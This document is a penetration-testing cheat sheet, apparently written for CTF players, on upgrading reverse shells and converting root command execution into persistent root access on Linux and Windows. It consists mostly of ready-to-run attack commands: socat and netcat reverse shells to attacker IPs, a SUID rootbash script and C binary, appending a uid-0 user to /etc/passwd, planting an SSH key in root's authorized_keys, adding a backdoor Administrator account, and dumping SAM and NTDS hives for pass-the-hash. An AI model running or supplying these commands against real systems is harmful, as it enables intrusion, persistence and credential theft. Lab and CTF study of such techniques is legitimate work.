
# Shell Upgrades
```bash
   _      __  __  ____          .-'~~~-.
 /' \    /\ \/\ \/\  _`\      .'o  oOOOo`.
/\_, \   \ \ \ \ \ \ \_\ \   :~~~-.oOo   o`.
\/_/\ \   \ \ \ \ \ \ ,__/   `. \ ~-.  oOOo.
   \ \ \   \ \ \_\ \ \ \/      `.; / ~.  OO:
    \ \_\   \ \_____\ \_\      .'  ;-- `.o.'
     \/_/    \/_____/\/_/     ,'  ; ~~--'~
                              ;  ;
_\|____________\|/__________\\;_\\//___\|/____
```


* [Semi-Interactive to Fully Interactive](#semi-interactive-to-fully-interactive)
* [Root RCE to Root Shell](#root-rce-to-root-shell)
* [Misc](#misc)

# Semi-Interactive to Fully Interactive

Upgrade a semi-interactive shell to a fully interactive shell.

## Linux
### Method 1 - Using python3's pty module:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

You can also create a binary version of this short script using [PyInstaller](https://www.pyinstaller.org/). That way python will not need to be installed on the target machine, but you will have to create different binaries for different architectures.

### Method 2 - Create a new reverse shell with socat:

Listen for the shell on your own machine:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:5555,reuseaddr
```

Transfer the socat binary to the target and send a reverse shell to your machine (10.0.0.42):
```bash
chmod +x ./socat
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.42:5555
```

You can get a staticly linked binary here: https://github.com/andrew-d/static-binaries


## Windows

Download nc.exe or nc64.exe
```powershell
nc64.exe 10.10.14.15 8888 -e cmd.exe
```
```powershell
nc64.exe 10.10.14.15 8888 -e powershell.exe
```

A powershell reverse shell one-liner might also do the trick.


# Root RCE to Root Shell

Often you might have some PrivEsc exploit that allows you to execute commands as super user, but it is too short-lived or unstable for a reverse shell.

## Linux

### Method 1 - Rootbash

This method is convenient and persistent, but easy to detect and also a really bad idea in a shared CTF environment for obvious reasons.

Create a bash script `/tmp/rootme.sh`:

```bash
#!/bin/bash
# rootme.sh
cp /bin/bash /tmp/rootbash
chown root /tmp/rootbash
chmod 777 /tmp/rootbash
chmod +s /tmp/rootbash
```

In your root RCE vector execute the script via:

```bash
/bin/bash /tmp/rootme.sh 
```

(Alternative) Of course you can also create a stand-alone binary instead of using a shell script:

```c
#include <stdio.h>
// rootme.c
int main() {
    system("cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod 777 /tmp/rootbash; chmod +s /tmp/rootbash");
    return 0;
}
```
```bash
gcc rootme.c -o /tmp/rootmebinary
...
chmod +x /tmp/rootmebinary
```

In your root RCE vector execute this via: 
```bash
/tmp/rootmebinary
```


Afterwards you should find a root SUID bash copy in `/tmp/rootbash`. If you cannot see it, then you might have to pick a different writable directory than `/tmp/`.

Finally gain a rootshell by typing: 
```bash
/tmp/rootbash -p

rootbash$ whoami
root
```

### Method 2 - /etc/passwd write

* **Make sure to make a backup of `/etc/passwd` before you do this!**

Users and password hashes found in `/etc/passwd` take precedence over `/etc/shadow` for backwards-compatibility reasons. So you can just add another root user (uid 0) with some password hash of your choice. This is another method that comes with the added benefit of persistence, but it is also pretty easy to detect.

This is preferable over editing the hash of the original root user in `/etc/shadow` since it is less likely to brick the system and other users of the system are not affected by this.

First create a new password hash:

```bash
# create a MD5-based ($1$ hash)
openssl passwd -1 -salt hack riddlemethis
$1$hack$UOovFA0tONnmC80m7JGrf.

# (alternative) create a sha-512 ($6$ hash)
mkpasswd -m sha-512 riddlemethis
$6$kZBdEfXkXeK1d1e3$6R7PBQ4Jlp9r06tB78nVOk1JY9JDSo5GSAFGBimdhoGKmD4oEs3oheSgj4.PjvCkhW/bPlCvV4F0HVKEyl45x/
```

Based on this the new line we will add to passwd looks like this:
```bash
hack:$1$hack$UOovFA0tONnmC80m7JGrf.:0:0:root:/root:/bin/bash
```

Using your root RCE you can now simply append this to /etc/passwd

```bash
# via root rce:
echo 'hack:$1$hack$UOovFA0tONnmC80m7JGrf.:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Alternatively (if you want to be more careful) make a copy of /etc/passwd, add the line via text editor and then replace the original passwd file with your forgery:

```bash
# regular user shell:
cp /etc/passwd /tmp/passwd.bak
cp /etc/passwd /tmp/passwdfun
nano /tmp/passwdfun
...
```
```bash
# root rce:
cp /tmp/passwdfun /tmp/passwd
```

After tampering with `/etc/passwd` you will be able to switch to the second root user with `su`:

```bash
su hack -
# type your password here, e.g.: riddlemethis

root$ whoami
root
root$ id
uid=0(root) gid=0(root) groups=0(root)
```

To reverse this, simply replace `/etc/passwd` again with your backup copy. You also might want to pick a proper password (and sha-512 hashing) if you want to do this in a shared CTF environment so it cannot be cracked in 5 seconds.

### Method 3 - Root SSH

This will only work if:

* Target runs SSH server
* Root login to SSH server is allowed
* Public key authentication is allowed

Nmap should point these out if the port is publicly accessible:
```bash
sudo nmap -vv --reason -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods $targetip
```

The file we are interested in is located at:

```bash
/root/.ssh/authorized_keys
```

It is possible this file does not exist yet. In that case create it like this via your root RCE:

```bash
# via root rce:
mkdir /root/.ssh
chmod 700 /root/.ssh
touch /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

As one-liner:
```bash
# via root rce:
mkdir /root/.ssh ; chmod 600 /root/.ssh ; touch /root/.ssh/authorized_keys ; chmod 700 /root/.ssh/authorized_keys
```

On your own machine generate a new key pair:

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa
# set a password or don't, doesn't matter
chmod 400 ./id_rsa
```

Via root RCE append the content of `id_rsa.pub` to the `/root/.ssh/authorized_keys` file

```bash
# via root rce:
echo 'ssh-rsa AAAAB3...aTx3Q== kali@kali' >> /root/.ssh/authorized_keys
```

Afterwards you should be able to connect via SSH to the root user of the target machine, using the newly created RSA private key:

```bash
ssh -i ./id_rsa root@TARGETIP
```

If this does not give you a shell as root user and instead asks for the root user password then it did not work.


## Windows

### Method 1 -- Create another Administrator

* Username: pentest
* Password: hunter8

```powershell
net user pentest hunter8 /add
net localgroup Administrators pentest /add
```

Being in localgroup Administrators usually implies access to rdp, winrm, smb, etc. though this might differ in Active Directory environments.

If you already have an interactive shell as local user, then you can use `psexec` (sysinternals) in order to spawn a shell as the new admin user.



### Method 2 -- Extract NTLM Hashes

```powershell
# Dump Secure Account Manager (SAM) database (admin required obviously)
reg save hklm\sam %TEMP%\sam
reg save hklm\system %TEMP%\system

# optional (AD)
reg save hklm\security %TEMP%\security
```

Transfer the exported files to your own machine and then use secretsdump to extract hashes and secrets:

```powershell
# transfer the files to a machine with impacket installed
# dump user hashes
secretsdump.py -system system -sam sam LOCAL
secretsdump.py -system system -sam sam -security security LOCAL
```
```powershell
# Alternative path: copy C:\Windows\NTDS\ntds.dit and system
secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```

Once you have the Administrator NTLM hash you should be able to perform pass-the-hash over SMB or WinRM.


# Misc
## Effective UID to actual UID

```bash
python -c 'import os,pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")';
```